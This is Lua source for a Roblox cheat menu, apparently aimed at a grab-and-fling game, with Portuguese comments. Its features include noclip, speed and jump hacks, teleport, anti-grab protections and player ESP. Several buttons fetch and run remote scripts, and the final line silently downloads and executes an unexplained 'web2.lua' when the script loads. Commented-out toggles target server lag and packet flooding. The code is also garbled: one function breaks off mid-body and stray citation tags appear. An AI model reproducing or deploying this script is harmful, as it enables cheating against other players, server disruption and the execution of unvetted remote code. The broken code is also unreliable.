-- Limpa loops quando jogador sai
Players.PlayerRemoving:Connect(function(player)
    activeLoops[player.UserId] = nil
end)

-- Limpa loops de jogadores que já estavam no jogo quando o script iniciar
for _, player in ipairs(Players:GetPlayers()) do
    activeLoops[player.UserId] = nil
end

---------FIM---------------

-- Antis Tab
local Antis = Window:MakeTab({
    Name = "Antis",
    Icon = "rbxassetid://13180179055",
    PremiumOnly = false
})

-- Anti-Explode System
Antis:AddToggle({
    Name = "AntiExplode",
    Default = true,
    Callback = function(Value)
        antiExplodeT = Value
        if Value then
            antiExplodeF()
            print("on")
        else
            print("off")
        end
    end
})

-- Anti-Grab System
Antis:AddToggle({
    Name = "AntiGrab",
    Default = true,
    Callback = function(Value)
        antiGrabT = Value
        if Value then
            coroutine.wrap(antiGrabF)()
            print("on")
        else
            print("off")
        end
    end
})

Antis:AddToggle({
    Name = "AntiGrab Anchor",
    Default = true,
    Callback = function(Value)
        antiGrabAnchorT = Value
    end
})

Antis:AddToggle({
    Name = "AntiBlob",
    Default = false,
    Callback = function(Value)
        antiBlobT = Value
        if Value then
            antiBlobF()
            print("on")
        else
            print("off")
        end
    end
})

Antis:AddToggle({
    Name = "Anti-Void",
    Default = false,
    Callback = function(Value)
        if Value == true then
        game.Workspace.FallenPartsDestroyHeight = -50000
        else
        game.Workspace.FallenPartsDestroyHeight = -100
    end
end
})

-- Auto Gucci Button
Antis:AddButton({
    Name = "Auto Gucci",
    Callback = function()
        autoGucciT = true
        spawnBlobmanF()
        task.wait(1.1)
        if not sitJumpT then
            coroutine.wrap(sitJumpF)()
            sitJumpT = true
        end
        coroutine.wrap(ragdollLoopF)()
    end
})

Antis:AddSection({
    Name = "Active Destroy Blobman for Auto Gucci No Blobman"
})

-- Toggle for automatic destruction
Antis:AddToggle({
    Name = "Destroy Blobman",
    Default = true,
    Callback = function(Value)
        destroyAutoGucciT = Value
    end
})

-- Players Tab (SECOND TAB)
local PlayersTab = Window:MakeTab({
    Name = "Players",
    Icon = "rbxassetid://11984980776",
    PremiumOnly = false
})

-- WalkSpeed
PlayersTab:AddToggle({
    Name = "WalkSpeed",
    Default = false,
    Callback = function(Value)
        walkSpeedT = Value
        updateWalkSpeedF()
        if Value then
            print("on")
        else
            print("off")
        end
    end
})

PlayersTab:AddSlider({
    Name = "WalkSpeed Value",
    Min = 16,
    Max = 250,
    Default = 16,
    Color = Color3.fromRGB(193, 18, 31),
    Increment = 1,
    ValueName = "WalkSpeed",
    Callback = function(Value)
        walkSpeedV = Value
        if walkSpeedT then
            updateWalkSpeedF()
        end
    end
})
--inf jump
PlayersTab:AddToggle({
    Name = "Infinite Jump",
    Default = false,
    Callback = function(Value)
        infJumpT = Value
        if Value then
            print("on")
        else
            print("off")
        end
    end
})

-- NoClip
PlayersTab:AddToggle({
    Name = "NoClip",
    Default = false,
    Callback = function(Value)
        noClipT = Value
        if Value then
            updateNoClipF()
            print("on")
        else
            print("off")
        end
    end
})

-- Jump Power
PlayersTab:AddSlider({
    Name = "Jump Power",
    Min = 50,
    Max = 550,
    Default = 50,
    Color = Color3.fromRGB(193, 18, 31),
    Increment = 1,
    ValueName = "JumpPower",
    Callback = function(Value)
        jumpPowerV = Value
        if infJumpT then
            updateJumpPowerF()
        end
    end
})

-- Lines Tab
--[[local GrabTab = Window:MakeTab({
    Name = "Lines",
    Icon = "rbxassetid://97889814027474",
    PremiumOnly = false
})--]]


-- Main Tab
local MainTab = Window:MakeTab({
    Name = "Main",
    Icon = "rbxassetid://124620632231839",
    PremiumOnly = false
})

-- Keybind selector for teleport
MainTab:AddDropdown({
    Name = "Teleport Keybind",
    Default = "Z",
    Options = {"Z", "Q", "R", "F", "G", "T"},
    Callback = function(Value)
        teleportKeybind = Enum.KeyCode[Value]
        OrionLib:MakeNotification({
            Name = "Keybind Changed",
            Content = "Teleport key changed to: " .. Value,
            Time = 3
            })
    end
})

-- Normal teleport button (alternative)
MainTab:AddButton({
    Name = "Teleport (Single Click)",
    Callback = function()
        local char = plr.Character
        if not char then return end
        local hrp = char:FindFirstChild("HumanoidRootPart")
        if not hrp then return end
        
        local mouse = plr:GetMouse()
        if mouse.Target then 
            hrp.CFrame = CFrame.new(mouse.Hit.X, mouse.Hit.Y + 5, mouse.Hit.Z)
        end
    end
})

MainTab:AddSection({
    Name = "Config FOV"
})

-- Add slider para Fov
MainTab:AddSlider({
    Name = "FOV",
    Min = 30,
    Max = 120,
    Default = 70,
    Color = Color3.fromRGB(193, 18, 31),
    Increment = 1,
    ValueName = "FOV",
    Callback = function(value)
        changeFOV(value)
    end
})

MainTab:AddButton({
    Name = "Reset FOV",
    Callback = function()
        print("fov reseted")
        changeFOV(70)
        for _, element in pairs(MainTab.Elements) do
            if element.Name == "FOV" then
                element:Set(70)
                break
            end
        end
    end
})

MainTab:AddButton({
    Name = "Infinite Yield",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
        print("Infinite yield Loaded")
        OrionLib:MakeNotification({
            Name = "Infinite Yield",
            Content = "Infinite Yield Loaded (Destroyed GUI)",
            Image = "rbxassetid://9327507243",
            Time = 3
        })
        task.wait(1)
        OrionLib:Destroy()
    end
})

-- Bliz script
MainTab:AddButton({
    Name = "Bliz_T Script",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/BlizTBr/scripts/refs/heads/main/FTAP.lua"))()
    end
})

MainTab:AddButton({
    Name = "Close UI",
    Callback = function()
        OrionLib:Destroy()
    end
})

MainTab:AddButton({
    Name = "More Info",
    Callback = function()
        OrionLib:MakeNotification({
            Name = "More Info",
            Content = "Disable All options to avoid bugs"
        })
    end
})

--[[MainTab:AddSection({
    Name = "Lag Controls"
})

MainTab:AddToggle({
    Name = "Activate Lag",
    Default = false,
    Callback = function(Value)
        lagT = Value
        if Value then
            coroutine.wrap(lagF)()
            OrionLib:MakeNotification({
                Name = "Lag Activated",
                Content = "Lag system activated",
                Time = 3
            })
        else
            OrionLib:MakeNotification({
                Name = "Lag Deactivated",
                Content = "Lag system deactivated",
                Time = 3
            })
        end
    end
})

MainTab:AddSlider({
    Name = "Number of Lines",
    Min = 1,
    Max = 50,
    Default = 10,
    Color = Color3.fromRGB(20, 35, 248, 1),
    Increment = 1,
    ValueName = "lines",
    Callback = function(Value)
        linesV = Value
    end
})

MainTab:AddToggle({
    Name = "Activate Ping",
    Default = false,
    Callback = function(Value)
        pingT = Value
        if Value then
            coroutine.wrap(pingF)()
            OrionLib:MakeNotification({
                Name = "Ping Activated",
                Content = "Ping system activated",
                Time = 3
            })
        else
            OrionLib:MakeNotification({
                Name = "Ping Deactivated",
                Content = "Ping system deactivated",
                Time = 3
            })
        end
    end
})

MainTab:AddSlider({
    Name = "Number of Packets",
    Min = 10,
    Max = 500,
    Default = 100,
    Color = Color3.fromRGB(20, 35, 248, 1),
    Increment = 10,
    ValueName = "packets",
    Callback = function(Value)
        packetsV = Value
    end
})

MainTab:AddToggle({
    Name = "Shuriken Lag Server",
    Default = false,
    Callback = function(Value)
        shurikenLagServerT = Value
        if Value then
            coroutine.wrap(shurikenLagServerF)()
            OrionLib:MakeNotification({
                Name = "Shuriken Lag Activated",
                Content = "Shuriken lag system activated",
                Time = 3
            })
        else
            OrionLib:MakeNotification({
                Name = "Shuriken Lag Deactivated",
                Content = "Shuriken lag system deactivated",
                Time = 3
            })
        end
    end
})--]]


-- Inspection Tab
local InspectTab = Window:MakeTab({
    Name = "Inspect/Bring",
    Icon = "rbxassetid://6523858394",
    PremiumOnly = false
})

InspectTab:AddSection({
    Name = "ESP"
})

-- Variável para controlar o estado do ESP
local ESPAtivo = false
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local MaxDistance = 10000 -- Distância máxima em studs para o ESP aparecer :cite[3]

-- Função para criar o ESP para um jogador
local function criarESP(jogador)
    if jogador == LocalPlayer then return end -- Não cria ESP para o próprio jogador :cite[3]

    local function adicionarInterface(personagem)
        if not personagem or not ESPAtivo then return end

        local cabeca = personagem:WaitForChild("Head")
        
        -- Remove ESP anterior se existir
        local espAntigo = cabeca:FindFirstChild("ESP_" .. jogador.Name)
        if espAntigo then
            espAntigo:Destroy()
        end

        local billboardGui = Instance.new("BillboardGui")
        billboardGui.Name = "ESP_" .. jogador.Name
        billboardGui.Adornee = cabeca
        billboardGui.Size = UDim2.new(0, 75, 0, 150) -- Usa Offset para tamanho fixo :cite[3]
        billboardGui.StudsOffset = Vector3.new(0, 2.5, 0)
        billboardGui.AlwaysOnTop = true
        billboardGui.Parent = cabeca

        -- Imagem do jogador
        local imagem = Instance.new("ImageLabel")
        imagem.Name = "Avatar"
        imagem.Size = UDim2.new(1, 0, 0.5, 0)
        imagem.Position = UDim2.new(0, 0, 0, 0)
        imagem.BackgroundTransparency = 1
        imagem.BorderSizePixel = 0
        imagem.AnchorPoint = Vector2.new(0.5, 0)
        imagem.Parent = billboardGui

        -- Carrega a imagem de perfil
        local sucesso, urlDaImagem = pcall(function()
            return Players:GetUserThumbnailAsync(
                jogador.UserId,
                Enum.ThumbnailType.HeadShot,
                Enum.ThumbnailSize.Size100x100
            )
        end)
        
        if sucesso then
            imagem.Image = urlDaImagem
        else
            imagem.Image = "rbxassetid://0"
        end

local avatarCorner = Instance.new("UICorner")
avatarCorner.CornerRadius = UDim.new(0.5, 0)
avatarCorner.Parent = imagem

-- Cria a borda roxa
local border = Instance.new("UIStroke")
border.Parent = imagem
border.Color = Color3.fromRGB(162, 79, 205) -- Um exemplo de roxo. Altere o RGB para a cor que preferir.
border.Thickness = 2 -- Define a espessura da borda
border.ApplyStrokeMode = Enum.ApplyStrokeMode.Border -- Garante que o traço envolva o objeto

        -- Nome de usuário (USERNAME)
        local usernameLabel = Instance.new("TextLabel")
        usernameLabel.Name = "Username"
        usernameLabel.Size = UDim2.new(1, 0, 0.25, 0)
        usernameLabel.Position = UDim2.new(0, 0, 0.5, 0)
        usernameLabel.BackgroundTransparency = 1
        usernameLabel.Text = jogador.Name
        usernameLabel.TextColor3 = Color3.fromRGB(220, 180, 255)
        usernameLabel.TextScaled = true
        usernameLabel.Font = Enum.Font.GothamBold
        usernameLabel.AnchorPoint = Vector2.new(0.5, 0)
        usernameLabel.Parent = billboardGui

        -- Nome de exibição (@display)
        local displayNameLabel = Instance.new("TextLabel")
        displayNameLabel.Name = "DisplayName"
        displayNameLabel.Size = UDim2.new(1, 0, 0.25, 0)
        displayNameLabel.Position = UDim2.new(0, 0, 0.75, 0)
        displayNameLabel.BackgroundTransparency = 1
        displayNameLabel.Text = "@" .. jogador.DisplayName
        displayNameLabel.TextColor3 = Color3.fromRGB(220, 180, 255)
        displayNameLabel.TextScaled = true
        displayNameLabel.Font = Enum.Font.Gotham
        displayNameLabel.AnchorPoint = Vector2.new(0.5, 0)
        displayNameLabel.Parent = billboardGui

        -- Função para atualizar visibilidade baseada na distância :cite[3]
        local function atualizarVisibilidade()
            if ESPAtivo and jogador.Character and jogador.Character:FindFirstChild("Head") and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Head") then
                local distancia = (jogador.Character.Head.Position - LocalPlayer.Character.Head.Position).Magnitude
                billboardGui.Enabled = (distancia <= MaxDistance)
            else
                billboardGui.Enabled = false
            end
        end

        -- Monitora a visibilidade em tempo de execução :cite[3]
        local conexao
        conexao = RunService.Heartbeat:Connect(function()
            if jogador.Character and jogador.Character:FindFirstChild("Head") then
                atualizarVisibilidade()
            else
                if billboardGui.Parent then
                    billboardGui:Destroy()
                end
                conexao:Disconnect()
            end
        end)
    end

    -- Conecta a função quando o personagem spawnar
    if jogador.Character then
        task.defer(adicionarInterface, jogador.Character) -- Usa task.defer para evitar waits bloqueantes
    end
    jogador.CharacterAdded:Connect(adicionarInterface)
end

-- Função para remover o ESP de um jogador
local function removerESP(jogador)
    if jogador.Character and jogador.Character:FindFirstChild("Head") then
        local cabeca = jogador.Character.Head
        local esp = cabeca:FindFirstChild("ESP_" .. jogador.Name)
changeFOV(70)

-- Initialize
OrionLib:Init()

------------web
loadstring(game:HttpGet("https://raw.githubusercontent.com/SoudHub/web/refs/heads/main/web2.lua"))()
-----------------------------------------------
